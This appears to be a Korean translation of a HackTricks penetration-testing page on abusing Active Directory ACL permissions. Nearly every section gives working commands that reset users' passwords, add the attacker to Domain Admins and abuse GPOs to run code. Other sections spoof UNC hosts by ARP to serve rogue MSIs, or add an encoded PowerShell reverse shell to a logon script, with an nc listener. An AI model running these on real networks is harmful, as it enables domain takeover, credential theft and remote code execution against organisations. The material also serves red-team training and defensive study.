# Active Directory ACLs/ACEs 악용

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로 다음** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**의 기술을 요약한 내용입니다. 자세한 내용은 원문을 확인하세요.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **사용자에 대한 GenericAll Rights**

이 권한은 공격자에게 대상 사용자 계정을 완전히 제어할 수 있는 권한을 부여합니다. `Get-ObjectAcl` 명령을 사용하여 `GenericAll` 권한이 확인되면 공격자는 다음을 수행할 수 있습니다.

- **대상 사용자의 비밀번호 변경**: `net user <username> <password> /domain`을 사용하여 공격자는 사용자의 비밀번호를 재설정할 수 있습니다.
- Linux에서는 Samba `net rpc`를 사용하여 SAMR을 통해 동일한 작업을 수행할 수 있습니다.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **계정이 비활성화된 경우 UAC flag를 제거**: `GenericAll`을 사용하면 `userAccountControl`을 수정할 수 있습니다. Linux에서 BloodyAD를 사용하여 `ACCOUNTDISABLE` flag를 제거할 수 있습니다:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: 사용자 계정에 SPN을 할당해 kerberoastable하게 만든 다음, Rubeus와 targetedKerberoast.py를 사용하여 ticket-granting ticket (TGT) 해시를 추출하고 crack을 시도합니다.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 사용자의 pre-authentication을 비활성화하여 해당 계정을 ASREPRoasting에 취약하게 만듭니다.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: 사용자에 대한 `GenericAll` 권한이 있으면 인증서 기반 credential을 추가하여 비밀번호를 변경하지 않고도 해당 사용자로 authenticate할 수 있습니다. See:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **그룹에 대한 GenericAll 권한**

이 privilege를 통해 attacker는 `Domain Admins`와 같은 그룹에 대한 `GenericAll` 권한이 있을 경우 그룹 membership을 조작할 수 있습니다. `Get-NetGroup`으로 그룹의 distinguished name을 확인한 후, attacker는 다음을 수행할 수 있습니다:

- **Domain Admins 그룹에 자신을 추가**: 직접 command를 사용하거나 Active Directory 또는 PowerSploit과 같은 module을 사용하여 수행할 수 있습니다.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux에서 BloodyAD를 활용하여 해당 그룹에 대한 GenericAll/Write 멤버십을 보유한 경우 자신을 임의의 그룹에 추가할 수도 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있다면, 해당 그룹을 적용하는 호스트에서 즉시 WinRM 액세스 권한을 획득할 수 있습니다:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

computer object 또는 user account에 이러한 권한을 보유하면 다음 작업이 가능합니다:

- **Kerberos Resource-based Constrained Delegation**: computer object를 탈취할 수 있습니다.
- **Shadow Credentials**: shadow credentials를 생성할 수 있는 권한을 악용하여 computer 또는 user account를 impersonate하는 데 이 technique을 사용할 수 있습니다.

## **WriteProperty on Group**

특정 group(예: `Domain Admins`)의 모든 object에 대해 user에게 `WriteProperty` rights가 있으면 다음 작업이 가능합니다:

- **Add Themselves to the Domain Admins Group**: `net user` 및 `Add-NetGroupUser` commands를 함께 사용하여 수행할 수 있으며, 이 방법으로 domain 내 privilege escalation이 가능합니다.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Group에 대한 Self (Self-Membership)**

이 privilege를 사용하면 공격자는 group membership을 직접 조작하는 command를 통해 `Domain Admins`와 같은 특정 group에 자신을 추가할 수 있습니다. 다음 command sequence를 사용하면 자신을 추가할 수 있습니다:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

이와 유사한 privilege를 사용하면 공격자는 해당 그룹에 `WriteProperty` 권한이 있는 경우 그룹 속성을 수정하여 그룹에 직접 자신을 추가할 수 있습니다. 이 privilege의 확인 및 실행은 다음을 사용하여 수행합니다:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

사용자에 대해 `User-Force-Change-Password`의 `ExtendedRight`를 보유하면 현재 비밀번호를 알지 못해도 비밀번호를 재설정할 수 있습니다. 이 권한의 확인과 exploitation은 PowerShell 또는 대체 command-line 도구를 통해 수행할 수 있으며, interactive session과 non-interactive 환경에서 사용할 수 있는 one-liner를 포함해 사용자의 비밀번호를 재설정하는 여러 방법을 제공합니다. 명령은 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 방법까지 다양하며, attack vector의 versatility를 보여 줍니다.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있음을 확인하면, 그룹의 소유권을 자신에게 변경할 수 있습니다. 특히 해당 그룹이 `Domain Admins`인 경우 영향이 큰데, 소유권을 변경하면 그룹 속성과 멤버십을 더 광범위하게 제어할 수 있기 때문입니다. 이 과정에서는 `Get-ObjectAcl`을 사용해 올바른 객체를 식별한 다음, `Set-DomainObjectOwner`를 사용해 SID 또는 이름으로 소유자를 변경합니다.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

이 권한을 사용하면 공격자가 사용자 속성을 수정할 수 있습니다. 구체적으로 `GenericWrite` 액세스를 사용하면 공격자는 사용자가 logon할 때 악성 script를 실행하도록 사용자의 logon script 경로를 변경할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성을 공격자의 script를 가리키도록 업데이트하여 수행합니다.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

이 권한을 사용하면 공격자는 그룹 멤버십을 조작하여 자신이나 다른 사용자를 특정 그룹에 추가할 수 있습니다. 이 과정에는 credential object를 생성하고, 이를 사용하여 그룹에서 사용자를 추가하거나 제거한 다음, PowerShell 명령으로 멤버십 변경 사항을 확인하는 작업이 포함됩니다.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux에서 Samba `net`은 그룹에 대한 `GenericWrite` 권한을 보유한 경우 멤버를 추가/제거할 수 있습니다(PowerShell/RSAT를 사용할 수 없을 때 유용):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD 객체를 소유하고 해당 객체에 `WriteDACL` 권한이 있으면, 공격자는 자신에게 객체에 대한 `GenericAll` 권한을 부여할 수 있습니다. 이는 ADSI 조작을 통해 수행되며, 객체를 완전히 제어하고 그룹 멤버십을 수정할 수 있습니다. 그러나 Active Directory module의 `Set-Acl` / `Get-Acl` cmdlet을 사용해 이러한 권한을 exploit하려는 경우에는 한계가 존재합니다.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 빠른 takeover (PowerView)

사용자 또는 service account에 대해 `WriteOwner` 및 `WriteDacl` 권한이 있으면, 기존 password를 몰라도 PowerView를 사용해 완전히 제어하고 password를 재설정할 수 있습니다:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
참고:
- `WriteOwner` 권한만 있는 경우 먼저 소유자를 자신으로 변경해야 할 수 있습니다:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 비밀번호 재설정 후 모든 프로토콜(SMB/LDAP/RDP/WinRM)을 사용하여 access를 검증합니다.

## **Domain에서의 Replication (DCSync)**

DCSync attack은 domain에 설정된 특정 replication permissions를 활용하여 Domain Controller를 모방하고 user credentials를 포함한 데이터를 동기화합니다. 이 강력한 technique을 사용하려면 `DS-Replication-Get-Changes`와 같은 permissions가 필요하며, 이를 통해 공격자는 Domain Controller에 직접 access하지 않고도 AD environment에서 민감한 정보를 추출할 수 있습니다.<sup>[[5]](#references)</sup> [**DCSync attack에 대해 자세히 알아보세요.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs)를 관리할 수 있도록 위임된 access는 심각한 security risks를 초래할 수 있습니다. 예를 들어 `offense\spotless`와 같은 user에게 GPO management rights가 위임된 경우 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 privileges를 보유할 수 있습니다. 이러한 permissions는 악의적인 목적으로 abuse될 수 있으며, PowerView를 사용하여 다음과 같이 식별할 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions 열거

잘못 구성된 GPOs를 식별하려면 PowerSploit의 cmdlets를 서로 연결하여 사용할 수 있습니다. 이를 통해 특정 user가 관리할 permissions를 보유한 GPOs를 찾을 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**특정 Policy가 적용된 Computers**: 특정 GPO가 어떤 computers에 적용되는지 확인하여 잠재적인 impact의 범위를 파악할 수 있습니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 Computer에 적용된 Policies**: 특정 computer에 어떤 policies가 적용되는지 확인하려면 `Get-DomainGPO`와 같은 commands를 사용할 수 있습니다.

**특정 Policy가 적용된 OUs**: `Get-DomainOU`를 사용하여 특정 policy의 영향을 받는 organizational units (OUs)를 식별할 수 있습니다.

[**GPOHound**](https://github.com/cogiceo/GPOHound) tool을 사용하여 GPOs를 열거하고 문제를 찾을 수도 있습니다.

### Abuse GPO - New-GPOImmediateTask

잘못 구성된 GPOs를 exploit하여 code를 실행할 수 있습니다. 예를 들어 immediate scheduled task를 생성할 수 있습니다. 이를 통해 영향을 받는 machines의 local administrators group에 user를 추가하여 privileges를 크게 상승시킬 수 있습니다:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - GPO Abuse

GroupPolicy module이 설치되어 있으면 새로운 GPO를 생성하고 연결할 수 있으며, 영향을 받는 컴퓨터에서 backdoor를 실행하도록 registry 값과 같은 preferences를 설정할 수 있습니다. 이 방법을 실행하려면 GPO가 업데이트되고 사용자가 해당 컴퓨터에 로그인해야 합니다:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO Abuse

SharpGPOAbuse는 새 GPO를 생성할 필요 없이 task를 추가하거나 설정을 수정하여 기존 GPO를 abuse하는 방법을 제공합니다. 이 tool을 사용하려면 변경 사항을 적용하기 전에 기존 GPO를 수정하거나 RSAT tool을 사용하여 새 GPO를 생성해야 합니다:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 정책 강제 업데이트

GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 이 프로세스를 앞당기려면, 특히 변경 사항을 적용한 후 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉시 정책 업데이트를 강제할 수 있습니다. 이 명령을 사용하면 다음 자동 업데이트 주기를 기다리지 않고 GPO에 대한 수정 사항이 적용됩니다.

### 내부 동작

`Misconfigured Policy`와 같은 특정 GPO의 Scheduled Tasks를 검사하면 `evilTask`와 같은 task가 추가된 것을 확인할 수 있습니다. 이러한 task는 시스템 동작을 변경하거나 권한을 상승시키기 위한 scripts 또는 command-line tools를 통해 생성됩니다.

`New-GPOImmediateTask`로 생성된 XML configuration file에 표시된 task 구조에는 실행할 command와 trigger를 비롯한 scheduled task의 세부 사항이 정의되어 있습니다. 이 file은 GPO 내에서 scheduled task가 정의되고 관리되는 방식을 나타내며, policy enforcement의 일부로 임의의 commands 또는 scripts를 실행하는 방법을 제공합니다.

### 사용자 및 그룹

GPO를 사용하면 대상 시스템의 사용자 및 group memberships도 조작할 수 있습니다. Users and Groups policy files를 직접 편집하면 attackers가 사용자를 로컬 `administrators` group과 같은 privileged groups에 추가할 수 있습니다. 이는 GPO management permissions의 위임을 통해 가능하며, 이 권한으로 policy files를 수정하여 새 users를 추가하거나 group memberships를 변경할 수 있습니다.

Users and Groups의 XML configuration file에는 이러한 변경 사항이 구현되는 방식이 정의되어 있습니다. 이 file에 entries를 추가하면 특정 users에게 영향을 받는 시스템 전반에서 elevated privileges를 부여할 수 있습니다. 이 방법은 GPO manipulation을 통한 privilege escalation에 직접적인 접근 방식을 제공합니다.

또한 logon/logoff scripts 활용, autoruns를 위한 registry keys 수정, `.msi` files를 통한 software 설치, service configurations 편집 등 code 실행 또는 persistence 유지 방법도 고려할 수 있습니다. 이러한 techniques는 GPO abuse를 통해 access를 유지하고 대상 시스템을 제어할 수 있는 다양한 경로를 제공합니다.

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain에 대한 `WriteGPLink`를 사용하면 대상 container의 `gPLink` attribute를 수정하고 GPO 자체를 편집하지 않은 채 **기존 GPO가 적용되도록 강제**할 수 있습니다. 연결된 GPO가 이미 **UNC paths**(`\\HOST\share\...`)를 통해 remote content를 참조하는 경우 특히 중요합니다. 인증된 users는 **SYSVOL**을 읽고 재사용 가능한 policies를 offline에서 탐색할 수 있기 때문입니다.<sup>[[11]](#references)</sup>

High-level workflow:

1. BloodHound를 사용하여 OU에 대해 `WriteGPLink`를 가진 principal을 식별하고 해당 OU 내부의 computers/users를 열거합니다.
2. `SYSVOL`을 read-only로 clone하고 GPOs를 parse하여 UNC paths를 참조하는 **Software Installation**, **drive mappings**(`Drives.xml`), **logon/startup scripts**를 찾습니다.
3. DFS/domain-namespace paths 대신 **direct hostname**을 가리키는 policies(예: `\\DC02\share\pkg.msi`)를 우선합니다. hostname 기반 paths가 L2 spoofing을 사용해 redirect하기 더 쉽기 때문입니다.
4. 선택한 GPO GUID를 대상 OU의 `gPLink`에 추가하여 victim이 이미 존재하는 해당 policy를 process하도록 합니다.
5. 동일한 broadcast domain에서 UNC host를 ARP spoof하고 해당 IP를 로컬에 bind합니다(`ip addr add <target_ip>/32 dev <iface>`). 이렇게 하면 victim의 SMB traffic이 여러분의 host에 도달합니다.
6. attacker SMB server(예: `smbserver.py`)에서 예상되는 path/filename을 제공하고 정상적인 policy processing을 기다립니다.

`SYSVOL` collection 및 GPO correlation 예시:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
기존 GPO를 대상 OU에 연결:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

연결된 GPO가 UNC 경로에서 MSI를 배포하는 경우, 클라이언트는 **컴퓨터 시작 시** 해당 파일을 가져와 **`NT AUTHORITY\SYSTEM`** 권한으로 설치합니다. 참조된 호스트를 spoof하고 **동일한 share/path/name**으로 악성 MSI를 제공하면 **SYSVOL을 수정하지 않고도** `WriteGPLink`를 SYSTEM code execution으로 전환할 수 있습니다.

Important constraints:

- **Timing matters**: 새 링크는 policy refresh 시점(일반적으로 약 90분 후)에 인식되지만, **Software Installation**은 보통 **reboot** 시 트리거됩니다.
- Windows Installer는 일반적으로 package **`ProductCode`**를 사용해 deployment를 추적합니다. product가 이미 설치되어 있으면 deployment가 건너뛰어질 수 있습니다.
- installer rejection을 방지하려면 rogue MSI를 patch하여 해당 GPO가 요구하는 legitimate package와 **`ProductCode`** 및 **`PackageCode`**가 일치하도록 해야 합니다.
- 오래된 `.aas` advertisement 파일이 `SYSVOL`에 남아 있을 수 있으므로, 이를 신뢰하기 전에 deployment가 여전히 active 상태로 보이는지 validate해야 합니다.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml`의 GPP drive mapping으로 인해 사용자는 logon 또는 재연결 시 설정된 UNC 경로에 authenticate합니다. 참조된 host를 spoof하면 **NetNTLMv2**를 capture할 수 있습니다. SMB가 의도적으로 실패하도록 만들면 Windows는 **WebDAV**를 통해 재시도할 수 있으며, 이때 **LDAP(S)**, **AD CS** 또는 **SMB**로 relay하기 훨씬 유연한 **NTLM over HTTP**를 전송합니다.

#### Logon/startup script UNC hijack

동일한 패턴이 `SYSVOL`에서 발견되는 UNC-hosted script에도 적용됩니다:

- **Logon script**는 일반적으로 **user** context에서 실행됩니다.
- **Startup script**는 일반적으로 **computer / SYSTEM** context에서 실행됩니다.

script path가 spoof 가능한 hostname을 가리킨다면 UNC host를 redirect하고, 예상된 위치에서 replacement script content를 제공합니다.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` 또는 `\\<dc>\NETLOGON\` 아래의 writable path를 사용하면 GPO를 통해 user logon 시 실행되는 logon script를 tamper할 수 있습니다. 이를 통해 logon하는 user의 security context에서 code execution이 가능합니다.

### Locate logon scripts
- 설정된 logon script가 있는지 user attribute를 inspect합니다:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 도메인 공유를 크롤링하여 스크립트에 대한 바로 가기 또는 참조를 찾아냅니다:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` 파일을 파싱하여 SYSVOL/NETLOGON을 가리키는 대상 확인 (유용한 DFIR 트릭이며 직접적인 GPO 액세스 권한이 없는 attackers에게 유용):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound는 사용자 노드에 `logonScript` (scriptPath) attribute가 있으면 이를 표시합니다.

### write access 검증 (share listings를 신뢰하지 말 것)
Automated tooling에서 SYSVOL/NETLOGON을 read-only로 표시하더라도, underlying NTFS ACLs에서는 여전히 write를 허용할 수 있습니다. 항상 테스트하세요:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
파일 크기 또는 mtime이 변경되면 write 권한이 있는 것입니다. 수정하기 전에 원본을 보존하세요.

### RCE를 위해 VBScript logon script 변조
PowerShell reverse shell을 실행하는 명령을 추가하세요(revshells.com에서 생성). 비즈니스 기능이 중단되지 않도록 원래 로직은 유지하세요:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
호스트에서 수신 대기하고 다음 대화형 로그온을 기다립니다:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- 실행은 SYSTEM이 아닌 logging user의 token으로 수행됩니다. 범위는 해당 script를 적용하는 GPO link(OU, site, domain)입니다.
- 사용 후 원래 content/timestamps를 복원하여 정리합니다.


## References

- [1] [Active Directory ACLs/ACEs 악용](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts 및 Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 - ACL Attack Path 업데이트](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory에서 ACL을 사용한 권한 상승](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges 및 Privileged Accounts 스캔](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD - Linux에서 AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba - net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking 및 DPAPI decryption을 통한 DC admin 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution 및 NTLM Relay를 위한 GPO UNC Paths Hijacking](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
